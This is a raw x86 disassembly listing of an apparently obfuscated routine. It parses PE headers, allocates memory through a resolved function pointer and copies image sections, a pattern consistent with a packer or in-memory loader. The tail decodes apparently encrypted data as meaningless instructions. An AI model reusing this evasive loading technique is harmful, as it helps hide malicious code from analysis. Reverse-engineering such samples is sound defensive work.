  41ff4a:	mov    DWORD PTR [ebp+0x1c],ecx
  41ff4d:	mov    ecx,DWORD PTR [ebp+0x18]
  41ff50:	mov    eax,DWORD PTR [esi]
  41ff52:	mov    DWORD PTR [ebp-0x20],eax
  41ff55:	mov    DWORD PTR [ebp+0x8],0xf89c8585
  41ff5c:	mov    edx,0xf89c8584
  41ff61:	mov    DWORD PTR [ebp-0x8],edx
  41ff64:	mov    eax,DWORD PTR [ebp+0x1c]
  41ff67:	mov    DWORD PTR [ebp+0x1c],eax
  41ff6a:	mov    eax,DWORD PTR [ebp+0x1c]
  41ff6d:	mov    eax,DWORD PTR [eax+0x190]
  41ff73:	mov    eax,DWORD PTR [eax]
  41ff75:	mov    DWORD PTR [ebp-0x24],ecx
  41ff78:	mov    ecx,DWORD PTR [ebp+0x1c]
  41ff7b:	mov    ecx,DWORD PTR [ecx+0x190]
  41ff81:	mov    ecx,DWORD PTR [ecx]
  41ff83:	add    ecx,DWORD PTR [eax+0x3c]
  41ff86:	mov    DWORD PTR [ebp+0x10],ecx
  41ff89:	mov    eax,DWORD PTR [ebp+0x8]
  41ff8c:	xor    eax,edi
  41ff8e:	add    eax,ebx
  41ff90:	mov    DWORD PTR [ebp-0x4],eax
  41ff93:	mov    eax,DWORD PTR [ebp+0x8]
  41ff96:	xor    eax,edi
  41ff98:	add    eax,ebx
  41ff9a:	mov    DWORD PTR [ebp+0x18],eax
  41ff9d:	mov    eax,DWORD PTR [ebp+0x10]
  41ffa0:	mov    eax,DWORD PTR [eax+0x50]
  41ffa3:	sub    eax,0xc
  41ffa6:	mov    DWORD PTR [ebp-0x28],eax
  41ffa9:	mov    eax,DWORD PTR [ebp+0x10]
  41ffac:	mov    eax,DWORD PTR [eax+0x38]
  41ffaf:	mov    ecx,DWORD PTR [ebp+0x10]
  41ffb2:	dec    eax
  41ffb3:	test   DWORD PTR [ecx+0x54],eax
  41ffb6:	mov    eax,DWORD PTR [ebp+0x10]
  41ffb9:	je     0x41ffd3
  41ffbb:	mov    eax,DWORD PTR [eax+0x38]
  41ffbe:	mov    ecx,DWORD PTR [ebp+0x10]
  41ffc1:	mov    ecx,DWORD PTR [ecx+0x54]
  41ffc4:	dec    eax
  41ffc5:	not    eax
  41ffc7:	and    ecx,eax
  41ffc9:	mov    eax,DWORD PTR [ebp+0x10]
  41ffcc:	mov    eax,DWORD PTR [eax+0x38]
  41ffcf:	add    eax,ecx
  41ffd1:	jmp    0x41ffd6
  41ffd3:	mov    eax,DWORD PTR [eax+0x54]
  41ffd6:	mov    DWORD PTR [ebp+0x1c],eax
  41ffd9:	mov    eax,DWORD PTR [ebp+0x8]
  41ffdc:	xor    eax,edi
  41ffde:	add    eax,ebx
  41ffe0:	mov    DWORD PTR [ebp+0x18],eax
  41ffe3:	mov    eax,DWORD PTR [ebp+0x8]
  41ffe6:	xor    eax,edi
  41ffe8:	add    eax,ebx
  41ffea:	mov    DWORD PTR [ebp+0x18],eax
  41ffed:	mov    eax,DWORD PTR [ebp+0x8]
  41fff0:	mov    ecx,DWORD PTR [ebp-0x24]
  41fff3:	xor    eax,edi
  41fff5:	add    eax,ebx
  41fff7:	mov    DWORD PTR [ecx],eax
  41fff9:	mov    DWORD PTR [ebp+0x18],edx
  41fffc:	mov    DWORD PTR [ebp+0x18],0xf89c85bb
  420003:	mov    DWORD PTR [ebp+0x18],0xf89c85ba
  42000a:	mov    DWORD PTR [ebp+0x18],0xf89c85b9
  420011:	mov    eax,DWORD PTR [ebp-0x8]
  420014:	mov    ecx,DWORD PTR [ebp+0x1c]
  420017:	xor    eax,edi
  420019:	add    eax,ebx
  42001b:	imul   eax,ecx
  42001e:	mov    ecx,DWORD PTR [ebp+0x8]
  420021:	mov    edx,DWORD PTR [ebp-0x28]
  420024:	xor    ecx,edi
  420026:	lea    ecx,[ecx+edx*1+0x3272e2]
  42002d:	cmp    eax,ecx
  42002f:	jae    0x4203e0
  420035:	mov    eax,DWORD PTR [ebp+0x8]
  420038:	xor    eax,edi
  42003a:	add    eax,ebx
  42003c:	mov    DWORD PTR [ebp+0x18],eax
  42003f:	mov    eax,DWORD PTR [ebp+0x1c]
  420042:	add    eax,DWORD PTR [ebp-0x1c]
  420045:	mov    DWORD PTR [ebp-0x4],eax
  420048:	push   DWORD PTR [ebp-0x4]
  42004b:	mov    esi,DWORD PTR [ebp-0x1c]
  42004e:	mov    ecx,DWORD PTR [ebp+0x10]
  420051:	call   0x41f149
  420056:	mov    DWORD PTR [ebp+0xc],eax
  420059:	mov    DWORD PTR [ebp-0x18],0xf89c85bd
  420060:	mov    eax,DWORD PTR [ebp-0x18]
  420063:	xor    eax,edi
  420065:	lea    ecx,[ebp-0x40]
  420068:	add    eax,ebx
  42006a:	push   ecx
  42006b:	call   0x41f72c
  420070:	mov    eax,DWORD PTR [ebp+0xc]
  420073:	test   eax,eax
  420075:	je     0x4200c5
  420077:	mov    eax,DWORD PTR [ebp-0x18]
  42007a:	xor    eax,edi
  42007c:	add    eax,ebx
  42007e:	push   eax
  42007f:	push   DWORD PTR [ebp+0xc]
  420082:	lea    eax,[ebp-0x40]
  420085:	push   eax
  420086:	call   0x41f5d3
  42008b:	mov    eax,DWORD PTR [ebp-0x4]
  42008e:	mov    DWORD PTR [ebp-0x18],eax
  420091:	mov    eax,DWORD PTR [ebp-0x18]
  420094:	mov    ecx,DWORD PTR [ebp-0x1c]
  420097:	sub    eax,ecx
  420099:	mov    DWORD PTR [ebp-0x18],eax
  42009c:	mov    eax,DWORD PTR [ebp+0xc]
  42009f:	mov    ecx,DWORD PTR [ebp+0xc]
  4200a2:	mov    eax,DWORD PTR [eax+0x10]
  4200a5:	add    eax,DWORD PTR [ecx+0xc]
  4200a8:	mov    ecx,DWORD PTR [ebp-0x18]
  4200ab:	cmp    ecx,eax
  4200ad:	jb     0x4200c5
  4200af:	mov    eax,DWORD PTR [ebp+0xc]
  4200b2:	mov    eax,DWORD PTR [eax+0xc]
  4200b5:	mov    ecx,DWORD PTR [ebp+0xc]
  4200b8:	add    eax,DWORD PTR [ecx+0x8]
  4200bb:	mov    ecx,DWORD PTR [ebp-0x18]
  4200be:	sub    eax,ecx
  4200c0:	jmp    0x4203b3
  4200c5:	push   0xc
  4200c7:	push   DWORD PTR [ebp-0x4]
  4200ca:	lea    eax,[ebp-0x4c]
  4200cd:	push   eax
  4200ce:	call   0x41f5d3
  4200d3:	mov    eax,0xf89c8585
  4200d8:	mov    DWORD PTR [ebp-0x2c],eax
  4200db:	mov    DWORD PTR [ebp-0x30],0xf89c8584
  4200e2:	mov    DWORD PTR [ebp-0x34],0xf89c85bb
  4200e9:	mov    DWORD PTR [ebp-0x38],0xf89c85ba
  4200f0:	lea    ecx,[ebp-0x2c]
  4200f3:	mov    DWORD PTR [ebp-0xc],ecx
  4200f6:	lea    ecx,[ebp-0x30]
  4200f9:	mov    DWORD PTR [ebp-0x10],ecx
  4200fc:	lea    ecx,[ebp-0x34]
  4200ff:	mov    DWORD PTR [ebp+0xc],ecx
  420102:	lea    ecx,[ebp-0x38]
  420105:	mov    DWORD PTR [ebp-0x14],ecx
  420108:	mov    ecx,DWORD PTR [ebp+0x8]
  42010b:	xor    ecx,edi
  42010d:	add    ecx,ebx
  42010f:	mov    DWORD PTR [ebp-0x18],ecx
  420112:	jmp    0x42030e
  420117:	cmp    eax,0xf89c85bb
  42011c:	je     0x420320
  420122:	mov    ecx,DWORD PTR [ebp-0x8]
  420125:	xor    ecx,edi
  420127:	mov    esi,eax
  420129:	add    ecx,ebx
  42012b:	mov    DWORD PTR [ebp+0x18],ecx
  42012e:	mov    eax,DWORD PTR [ebp-0x18]
  420131:	xor    esi,edi
  420133:	lea    eax,[eax+esi*1+0x3272e2]
  42013a:	mov    DWORD PTR [ebp-0x18],eax
  42013d:	mov    eax,DWORD PTR [ebp-0x8]
  420140:	mov    ecx,DWORD PTR [ebp-0x18]
  420143:	xor    eax,edi
  420145:	add    eax,ebx
  420147:	cmp    ecx,eax
  420149:	jne    0x42015e
  42014b:	mov    eax,DWORD PTR [ebp+0x8]
  42014e:	xor    eax,edi
  420150:	add    eax,ebx
  420152:	push   eax
  420153:	push   0xc
  420155:	lea    eax,[ebp-0x4c]
  420158:	push   eax
  420159:	call   0x41fb60
  42015e:	mov    eax,DWORD PTR [ebp-0xc]
  420161:	mov    eax,DWORD PTR [eax]
  420163:	xor    eax,edi
  420165:	mov    al,BYTE PTR [ebp+eax*1+0x327296]
  42016c:	mov    ecx,DWORD PTR [ebp+0x8]
  42016f:	xor    ecx,edi
  420171:	movzx  eax,al
  420174:	add    ecx,ebx
  420176:	cmp    eax,ecx
  420178:	je     0x4202f6
  42017e:	mov    eax,DWORD PTR [ebp-0x10]
  420181:	mov    eax,DWORD PTR [eax]
  420183:	xor    eax,edi
  420185:	mov    al,BYTE PTR [ebp+eax*1+0x327296]
  42018c:	mov    ecx,DWORD PTR [ebp+0x8]
  42018f:	xor    ecx,edi
  420191:	movzx  eax,al
  420194:	add    ecx,ebx
  420196:	cmp    eax,ecx
  420198:	je     0x4202f6
  42019e:	mov    eax,DWORD PTR [ebp+0xc]
  4201a1:	mov    eax,DWORD PTR [eax]
  4201a3:	xor    eax,edi
  4201a5:	mov    al,BYTE PTR [ebp+eax*1+0x327296]
  4201ac:	mov    ecx,DWORD PTR [ebp+0x8]
  4201af:	xor    ecx,edi
  4201b1:	movzx  eax,al
  4201b4:	add    ecx,ebx
  4201b6:	cmp    eax,ecx
  4201b8:	je     0x4202f6
  4201be:	mov    eax,DWORD PTR [ebp-0x14]
  4201c1:	mov    eax,DWORD PTR [eax]
  4201c3:	xor    eax,edi
  4201c5:	mov    al,BYTE PTR [ebp+eax*1+0x327296]
  4201cc:	mov    ecx,DWORD PTR [ebp+0x8]
  4201cf:	xor    ecx,edi
  4201d1:	movzx  eax,al
  4201d4:	add    ecx,ebx
  4201d6:	cmp    eax,ecx
  4201d8:	je     0x4202f6
  4201de:	mov    eax,DWORD PTR [ebp-0x10]
  4201e1:	mov    eax,DWORD PTR [eax]
  4201e3:	xor    eax,edi
  4201e5:	mov    al,BYTE PTR [ebp+eax*1+0x327296]
  4201ec:	mov    ecx,DWORD PTR [ebp-0xc]
  4201ef:	mov    ecx,DWORD PTR [ecx]
  4201f1:	xor    ecx,edi
  4201f3:	mov    cl,BYTE PTR [ebp+ecx*1+0x327296]
  4201fa:	xor    al,cl
  4201fc:	mov    ecx,DWORD PTR [ebp+0xc]
  4201ff:	mov    ecx,DWORD PTR [ecx]
  420201:	xor    ecx,edi
  420203:	mov    cl,BYTE PTR [ebp+ecx*1+0x327296]
  42020a:	or     al,cl
  42020c:	mov    ecx,DWORD PTR [ebp-0xc]
  42020f:	mov    ecx,DWORD PTR [ecx]
  420211:	xor    ecx,edi
  420213:	mov    cl,BYTE PTR [ebp+ecx*1+0x32729a]
  42021a:	cmp    cl,al
  42021c:	jne    0x4202f6
  420222:	mov    eax,DWORD PTR [ebp+0xc]
  420225:	mov    eax,DWORD PTR [eax]
  420227:	xor    eax,edi
  420229:	mov    al,BYTE PTR [ebp+eax*1+0x327296]
  420230:	mov    ecx,DWORD PTR [ebp-0x10]
  420233:	mov    ecx,DWORD PTR [ecx]
  420235:	xor    ecx,edi
  420237:	mov    cl,BYTE PTR [ebp+ecx*1+0x327296]
  42023e:	xor    al,cl
  420240:	mov    ecx,DWORD PTR [ebp-0x14]
  420243:	mov    ecx,DWORD PTR [ecx]
  420245:	xor    ecx,edi
  420247:	mov    cl,BYTE PTR [ebp+ecx*1+0x327296]
  42024e:	or     al,cl
  420250:	mov    ecx,DWORD PTR [ebp-0x10]
  420253:	mov    ecx,DWORD PTR [ecx]
  420255:	xor    ecx,edi
  420257:	mov    cl,BYTE PTR [ebp+ecx*1+0x32729a]
  42025e:	cmp    cl,al
  420260:	jne    0x4202f6
  420266:	mov    eax,DWORD PTR [ebp-0x14]
  420269:	mov    eax,DWORD PTR [eax]
  42026b:	xor    eax,edi
  42026d:	mov    al,BYTE PTR [ebp+eax*1+0x327296]
  420274:	mov    ecx,DWORD PTR [ebp+0xc]
  420277:	mov    ecx,DWORD PTR [ecx]
  420279:	xor    ecx,edi
  42027b:	mov    cl,BYTE PTR [ebp+ecx*1+0x327296]
  420282:	xor    al,cl
  420284:	mov    ecx,DWORD PTR [ebp-0xc]
  420287:	mov    ecx,DWORD PTR [ecx]
  420289:	xor    ecx,edi
  42028b:	mov    cl,BYTE PTR [ebp+ecx*1+0x327296]
  420292:	or     al,cl
  420294:	mov    ecx,DWORD PTR [ebp+0xc]
  420297:	mov    ecx,DWORD PTR [ecx]
  420299:	xor    ecx,edi
  42029b:	mov    cl,BYTE PTR [ebp+ecx*1+0x32729a]
  4202a2:	cmp    cl,al
  4202a4:	jne    0x4202f6
  4202a6:	mov    eax,DWORD PTR [ebp-0x14]
  4202a9:	mov    eax,DWORD PTR [eax]
  4202ab:	xor    eax,edi
  4202ad:	mov    al,BYTE PTR [ebp+eax*1+0x327296]
  4202b4:	mov    ecx,DWORD PTR [ebp-0xc]
  4202b7:	mov    ecx,DWORD PTR [ecx]
  4202b9:	xor    ecx,edi
  4202bb:	mov    cl,BYTE PTR [ebp+ecx*1+0x327296]
  4202c2:	xor    al,cl
  4202c4:	mov    ecx,DWORD PTR [ebp-0x10]
  4202c7:	mov    ecx,DWORD PTR [ecx]
  4202c9:	xor    ecx,edi
  4202cb:	mov    cl,BYTE PTR [ebp+ecx*1+0x327296]
  4202d2:	or     al,cl
  4202d4:	mov    ecx,DWORD PTR [ebp-0x14]
  4202d7:	mov    ecx,DWORD PTR [ecx]
  4202d9:	xor    ecx,edi
  4202db:	mov    cl,BYTE PTR [ebp+ecx*1+0x32729a]
  4202e2:	cmp    cl,al
  4202e4:	jne    0x4202f6
  4202e6:	lea    eax,[ebp-0x4c]
  4202e9:	push   eax
  4202ea:	call   0x41fdb1
  4202ef:	mov    ecx,DWORD PTR [ebp-0x44]
  4202f2:	cmp    eax,ecx
  4202f4:	je     0x420300
  4202f6:	mov    eax,DWORD PTR [ebp+0x8]
  4202f9:	xor    eax,edi
  4202fb:	add    eax,ebx
  4202fd:	mov    DWORD PTR [ebp+0x18],eax
  420300:	mov    eax,DWORD PTR [ebp-0x8]
  420303:	xor    eax,edi
  420305:	lea    eax,[eax+esi*1+0x3272e2]
  42030c:	xor    eax,edi
  42030e:	mov    ecx,DWORD PTR [ebp+0x8]
  420311:	mov    edx,DWORD PTR [ebp+0x18]
  420314:	xor    ecx,edi
  420316:	add    ecx,ebx
  420318:	cmp    edx,ecx
  42031a:	je     0x420117
  420320:	mov    eax,DWORD PTR [ebp+0x8]
  420323:	mov    ecx,DWORD PTR [ebp+0x18]
  420326:	xor    eax,edi
  420328:	add    eax,ebx
  42032a:	cmp    ecx,eax
  42032c:	jne    0x42033f
  42032e:	mov    eax,DWORD PTR [ebp-0x8]
  420331:	mov    ecx,DWORD PTR [ebp+0x1c]
  420334:	xor    eax,edi
  420336:	lea    eax,[eax+ecx*1+0x3272e2]
  42033d:	jmp    0x4203b6
  42033f:	push   0x18
  420341:	push   DWORD PTR [ebp-0x4]
  420344:	lea    eax,[ebp-0x64]
  420347:	push   eax
  420348:	call   0x41f5d3
  42034d:	mov    eax,DWORD PTR [ebp+0x8]
  420350:	mov    ecx,DWORD PTR [ebp-0x18]
  420353:	xor    eax,edi
  420355:	add    eax,ebx
  420357:	cmp    eax,ecx
  420359:	je     0x42036e
  42035b:	mov    eax,DWORD PTR [ebp+0x8]
  42035e:	xor    eax,edi
  420360:	add    eax,ebx
  420362:	push   eax
  420363:	push   0x18
  420365:	lea    eax,[ebp-0x64]
  420368:	push   eax
  420369:	call   0x41fb60
  42036e:	mov    eax,DWORD PTR [ebp-0x4]
  420371:	add    eax,0x18
  420374:	mov    DWORD PTR [ebp+0x18],eax
  420377:	push   DWORD PTR [ebp-0x50]
  42037a:	push   DWORD PTR [ebp+0x18]
  42037d:	mov    eax,DWORD PTR [ebp-0x54]
  420380:	add    eax,DWORD PTR [ebp-0x20]
  420383:	push   eax
  420384:	call   0x41f5d3
  420389:	mov    eax,DWORD PTR [ebp+0x8]
  42038c:	mov    ecx,DWORD PTR [ebp-0x18]
  42038f:	xor    eax,edi
  420391:	add    eax,ebx
  420393:	cmp    eax,ecx
  420395:	je     0x4203a8
  420397:	push   0x0
  420399:	push   DWORD PTR [ebp-0x50]
  42039c:	mov    eax,DWORD PTR [ebp-0x54]
  42039f:	add    eax,DWORD PTR [ebp-0x20]
  4203a2:	push   eax
  4203a3:	call   0x41fb60
  4203a8:	mov    eax,DWORD PTR [ebp-0x24]
  4203ab:	mov    ecx,DWORD PTR [ebp-0x50]
  4203ae:	add    DWORD PTR [eax],ecx
  4203b0:	mov    eax,DWORD PTR [ebp-0x50]
  4203b3:	add    eax,DWORD PTR [ebp+0x1c]
  4203b6:	mov    DWORD PTR [ebp+0x1c],eax
  4203b9:	mov    eax,DWORD PTR [ebp-0x8]
  4203bc:	mov    ecx,DWORD PTR [ebp+0x1c]
  4203bf:	xor    eax,edi
  4203c1:	add    eax,ebx
  4203c3:	imul   eax,ecx
  4203c6:	mov    ecx,DWORD PTR [ebp+0x8]
  4203c9:	mov    edx,DWORD PTR [ebp-0x28]
  4203cc:	xor    ecx,edi
  4203ce:	lea    ecx,[ecx+edx*1+0x3272e2]
  4203d5:	cmp    eax,ecx
  4203d7:	jb     0x420035
  4203dd:	mov    esi,DWORD PTR [ebp+0x14]
  4203e0:	mov    eax,DWORD PTR [ebp-0x20]
  4203e3:	mov    DWORD PTR [esi],eax
  4203e5:	jmp    0x42042c
  4203e7:	mov    ecx,DWORD PTR [ebp+0x8]
  4203ea:	mov    edx,DWORD PTR [ebp+0xc]
  4203ed:	xor    ecx,edi
  4203ef:	xor    edx,edi
  4203f1:	add    ecx,ebx
  4203f3:	add    edx,ebx
  4203f5:	cmp    ecx,edx
  4203f7:	jne    0x42040b
  4203f9:	mov    eax,ds:0x7f642d1e
  4203fe:	imul   eax,eax,0x9f15fcef
  420404:	mov    ds:0x7f642d1e,eax
  420409:	jmp    0x42042c
  42040b:	mov    ecx,DWORD PTR [ebp+0x8]
  42040e:	xor    ecx,edi
  420410:	add    ecx,ebx
  420412:	cmp    eax,ecx
  420414:	je     0x420422
  420416:	sub    DWORD PTR ds:0xf861e3e,0x709beac2
  420420:	jmp    0x42042c
  420422:	and    DWORD PTR ds:0x3343fa1e,0x5265ec3f
  42042c:	pop    edi
  42042d:	pop    esi
  42042e:	pop    ebx
  42042f:	leave  
  420430:	ret    0x18
  420433:	push   ebp
  420434:	mov    ebp,esp
  420436:	and    esp,0xfffffff8
  420439:	mov    eax,DWORD PTR [ebp+0x20]
  42043c:	sub    esp,0x14
  42043f:	push   ebx
  420440:	mov    ebx,DWORD PTR [ebp+0x14]
  420443:	push   esi
  420444:	push   edi
  420445:	cmp    eax,0xf89c8585
  42044a:	jne    0x420456
  42044c:	push   0xf89c8584
  420451:	jmp    0x420588
  420456:	mov    eax,DWORD PTR [ebp+0x20]
  420459:	cmp    eax,0xf89c8584
  42045e:	jne    0x42046a
  420460:	push   0xf89c85bb
  420465:	jmp    0x420588
  42046a:	mov    eax,DWORD PTR [ebp+0x20]
  42046d:	cmp    eax,0xf89c85bb
  420472:	jne    0x42047e
  420474:	push   0xf89c85ba
  420479:	jmp    0x420588
  42047e:	mov    eax,DWORD PTR [ebp+0x20]
  420481:	cmp    eax,0xf89c85ba
  420486:	jne    0x420492
  420488:	push   0xf89c85b9
  42048d:	jmp    0x420588
  420492:	mov    ecx,DWORD PTR [ebp+0x20]
  420495:	mov    eax,0xf89c85be
  42049a:	cmp    ecx,eax
  42049c:	jne    0x420558
  4204a2:	mov    eax,DWORD PTR [ebp+0x10]
  4204a5:	mov    DWORD PTR [esp+0xc],eax
  4204a9:	mov    eax,DWORD PTR [ebp+0x18]
  4204ac:	mov    DWORD PTR [esp+0x14],eax
  4204b0:	mov    eax,DWORD PTR [ebp+0xc]
  4204b3:	mov    DWORD PTR [esp+0x18],eax
  4204b7:	mov    eax,DWORD PTR [ebp+0x8]
  4204ba:	mov    DWORD PTR [esp+0x10],eax
  4204be:	mov    eax,DWORD PTR [esp+0x10]
  4204c2:	mov    ecx,DWORD PTR [esp+0x14]
  4204c6:	mov    edi,0x751089b
  4204cb:	xor    eax,edi
  4204cd:	mov    esi,0x3272e2
  4204d2:	add    eax,esi
  4204d4:	mov    DWORD PTR [ecx],eax
  4204d6:	mov    eax,DWORD PTR [esp+0xc]
  4204da:	mov    eax,DWORD PTR [eax+0x194]
  4204e0:	mov    ecx,DWORD PTR [eax]
  4204e2:	mov    eax,DWORD PTR [esp+0xc]
  4204e6:	mov    eax,DWORD PTR [eax+0x194]
  4204ec:	mov    eax,DWORD PTR [eax]
  4204ee:	add    eax,DWORD PTR [ecx+0x3c]
  4204f1:	mov    ecx,DWORD PTR [esp+0xc]
  4204f5:	mov    ecx,DWORD PTR [ecx+0x1d8]
  4204fb:	mov    ecx,DWORD PTR [ecx+0x14]
  4204fe:	push   0x4
  420500:	push   0x3000
  420505:	push   DWORD PTR [eax+0x50]
  420508:	push   0x0
  42050a:	call   ecx
  42050c:	mov    DWORD PTR [ebx],eax
  42050e:	mov    eax,DWORD PTR [esp+0x10]
  420512:	push   DWORD PTR [esp+0xc]
  420516:	xor    eax,edi
  420518:	add    eax,esi
  42051a:	mov    DWORD PTR [esp+0x20],eax
  42051e:	lea    eax,[esp+0x20]
  420522:	push   eax
  420523:	push   ebx
  420524:	push   DWORD PTR [esp+0x20]
  420528:	push   DWORD PTR [esp+0x28]
  42052c:	push   DWORD PTR [esp+0x24]
  420530:	call   0x41fef5
  420535:	mov    eax,DWORD PTR [esp+0x10]
  420539:	mov    ecx,DWORD PTR [ebx]
  42053b:	xor    eax,edi
  42053d:	add    eax,esi
  42053f:	cmp    ecx,eax
  420541:	je     0x42059f
  420543:	mov    eax,DWORD PTR [esp+0x18]
  420547:	mov    ecx,DWORD PTR [esp+0x14]
  42054b:	xor    eax,edi
  42054d:	add    eax,esi
  42054f:	imul   eax,DWORD PTR [esp+0x1c]
  420554:	mov    DWORD PTR [ecx],eax
  420556:	jmp    0x42059f
  420558:	mov    ecx,DWORD PTR [ebp+0x20]
  42055b:	cmp    ecx,0xf89c85b9
  420561:	jne    0x42056a
  420563:	push   0xf89c85b8
  420568:	jmp    0x420588
  42056a:	mov    ecx,DWORD PTR [ebp+0x20]
  42056d:	cmp    ecx,0xf89c85b8
  420573:	jne    0x42057c
  420575:	push   0xf89c85bf
  42057a:	jmp    0x420588
  42057c:	mov    ecx,DWORD PTR [ebp+0x20]
  42057f:	cmp    ecx,0xf89c85bf
  420585:	jne    0x42059f
  420587:	push   eax
  420588:	push   DWORD PTR [ebp+0x1c]
  42058b:	push   DWORD PTR [ebp+0x18]
  42058e:	push   ebx
  42058f:	push   DWORD PTR [ebp+0x10]
  420592:	push   DWORD PTR [ebp+0xc]
  420595:	push   DWORD PTR [ebp+0x8]
  420598:	call   0x420433
  42059d:	mov    DWORD PTR [ebx],eax
  42059f:	mov    eax,DWORD PTR [ebx]
  4205a1:	pop    edi
  4205a2:	pop    esi
  4205a3:	pop    ebx
  4205a4:	mov    esp,ebp
  4205a6:	pop    ebp
  4205a7:	ret    0x1c
  4205aa:	push   ebp
  4205ab:	mov    ebp,esp
  4205ad:	sub    esp,0xc
  4205b0:	mov    eax,0xf89c8585
  4205b5:	mov    DWORD PTR [ebp-0x8],eax
  4205b8:	mov    DWORD PTR [ebp-0xc],0xf89c8584
  4205bf:	mov    ecx,DWORD PTR [ebp-0x8]
  4205c2:	xor    ecx,0x751089b
  4205c8:	add    ecx,0x3272e2
  4205ce:	mov    DWORD PTR [ebp-0x4],ecx
  4205d1:	mov    ecx,DWORD PTR [ebp+0xc]
  4205d4:	push   eax
  4205d5:	mov    DWORD PTR [ebp+0xc],ecx
  4205d8:	push   DWORD PTR [ebp+0xc]
  4205db:	lea    eax,[ebp-0x4]
  4205de:	push   DWORD PTR [ebp+0x8]
  4205e1:	push   eax
  4205e2:	push   DWORD PTR [ebp+0xc]
  4205e5:	push   DWORD PTR [ebp-0xc]
  4205e8:	push   DWORD PTR [ebp-0x8]
  4205eb:	call   0x420433
  4205f0:	mov    DWORD PTR [ebp-0x4],eax
  4205f3:	mov    eax,DWORD PTR [ebp-0x4]
  4205f6:	leave  
  4205f7:	ret    0x8
  4205fa:	jg     0x4205b0
  4205fc:	jge    0xf741c5d1
  420602:	add    ebp,DWORD PTR [eax-0xa]
  420605:	data16 sbb BYTE PTR [edx+0x59],0xf6
  42060a:	or     BYTE PTR [ebx+0x1fc0001],al
  420610:	add    BYTE PTR [eax],al
  420612:	repz sbb eax,0x45269118
  420618:	jae    0x42064c
  42061a:	mov    ebp,DWORD PTR [edx-0x5]
  42061d:	xlat   BYTE PTR ds:[ebx]
  42061e:	xchg   ecx,eax
  42061f:	std    
  420620:	adc    BYTE PTR [edi-0x4dc229d2],ch
  420626:	fwait
  420627:	ins    BYTE PTR es:[edi],dx
  420628:	adc    eax,0x88c85fef
  42062d:	repnz in eax,0x1b
  420630:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420631:	pop    eax
  420632:	stc    
  420633:	push   es
  420634:	inc    esp
  420635:	test   eax,0x550117ef
  42063a:	aad    0x5c
  42063c:	loopne 0x420653
  42063e:	sbb    dh,0x40
  420641:	mov    edi,0x7c7c2469
  420646:	mov    ecx,0xaa0e6f55
  42064b:	pop    eax
  42064c:	and    ebp,edx
  42064e:	hlt    
  42064f:	jmp    0x5386:0x8e0606
  420656:	test   bh,bl
  420658:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420659:	mov    dh,0x9b
  42065b:	mov    WORD PTR [edi-0x47],es
  42065e:	mov    cl,0x1e
  420660:	rol    BYTE PTR [ebp-0x73],cl
  420663:	or     DWORD PTR [eax-0x52f24b83],esp
  420669:	je     0x4206ea
  42066b:	fwait
  42066c:	xchg   edi,eax
  42066d:	inc    edx
  42066e:	(bad)  
  42066f:	addr16 mov bh,0x59
  420672:	pop    es
  420673:	out    dx,eax
  420674:	shr    bh,1
  420676:	cmp    DWORD PTR [ebp+0x1a],esp
  420679:	jae    0x4206fa
  42067b:	shl    DWORD PTR [ebx],1
  42067d:	je     0x4206fe
  42067f:	stos   DWORD PTR es:[edi],eax
  420680:	shr    DWORD PTR [ebx+0x7333ec84],1
  420686:	xor    al,0x9b
  420688:	aaa    
  420689:	jne    0x420660
  42068b:	fnstcw WORD PTR [ebx-0x437cbb78]
  420691:	push   esi
  420692:	fcmove st,st(2)
  420694:	test   eax,0xb5eaef99
  420699:	(bad)  
  42069b:	stc    
  42069c:	jnp    0x4206d7
  42069e:	or     DWORD PTR [esi-0x36],esi
  4206a1:	test   eax,0xe0690b8f
  4206a6:	fisttp DWORD PTR [edi+esi*2+0x380ecf8a]
  4206ad:	or     eax,0x550dced8
  4206b2:	mov    ah,0x35
  4206b4:	pop    ebp
  4206b5:	cmp    ecx,ebx
  4206b7:	mov    WORD PTR [eax-0x6ad4e11],?
  4206bd:	mov    ebp,es
  4206bf:	ret    
  4206c0:	pop    ecx
  4206c1:	mov    al,0x21
  4206c3:	mov    eax,0xc418dc5b
  4206c8:	call   0xbef5:0x92cb6ec1
  4206cf:	fs mov dl,0xe0
  4206d2:	(bad)  
  4206d3:	jmp    0xf108:0x1defa190
  4206da:	inc    edi
  4206db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4206dc:	mov    bl,0xf1
  4206de:	mov    cl,0x31
  4206e0:	jl     0x42068d
  4206e2:	aas    
  4206e3:	jae    0x420756
  4206e5:	aas    
  4206e6:	xor    BYTE PTR [ecx-0x2],0xf1
  4206ea:	pop    ebp
  4206eb:	add    ebp,DWORD PTR [ebx-0x21400e7f]
  4206f1:	mov    al,ds:0xf8122ab4
  4206f6:	push   esp
  4206f7:	mov    BYTE PTR [edx+0x3],ch
  4206fa:	and    BYTE PTR [edx],cl
  4206fc:	rcr    ebp,0x2e
  4206ff:	mov    eax,0x931e4218
  420704:	pop    edx
  420705:	mov    ds:0xad7a3da8,al
  42070a:	seto   dl
  42070d:	push   ebx
  42070e:	mov    ebx,0x418b6bdc
  420713:	inc    edi
  420714:	xor    bl,BYTE PTR [esi+0x2bd829c6]
  42071a:	pop    edx
  42071b:	sub    ch,0x30
  42071e:	jmp    0x4206a0
  420720:	arpl   di,dx
  420722:	inc    edi
  420723:	loope  0x42074e
  420725:	mov    WORD PTR [ebx+ebp*1-0x45eb8c82],?
  42072c:	sub    ch,bl
  42072e:	add    eax,0xb67ec8d2
  420733:	sub    esp,DWORD PTR [ecx]
  420735:	aaa    
  420736:	sbb    eax,0xb26db14c
  42073b:	ficomp WORD PTR [ebx-0x43]
  42073e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42073f:	int    0x22
  420741:	mov    bl,0x57
  420743:	loop   0x420788
  420745:	imul   eax,DWORD PTR [ebx+0xf],0x54f1f6f6
  42074c:	cdq    
  42074d:	fcmovne st,st(5)
  42074f:	xor    ebp,ebx
  420751:	push   eax
  420752:	push   ebx
  420753:	xchg   esp,eax
  420754:	in     eax,dx
  420755:	pusha  
  420756:	dec    esi
  420757:	call   0x2dd3:0x6152c7ca
  42075e:	int    0x46
  420760:	xor    eax,0xa6034b96
  420765:	adc    DWORD PTR [edx+0x58],edx
  420768:	pop    ebx
  420769:	mov    al,0xf4
  42076b:	cmc    
  42076c:	xor    eax,0x22c0af55
  420771:	jmp    0x77c4f55a
  420776:	pop    esp
  420777:	aam    0x70
  420779:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
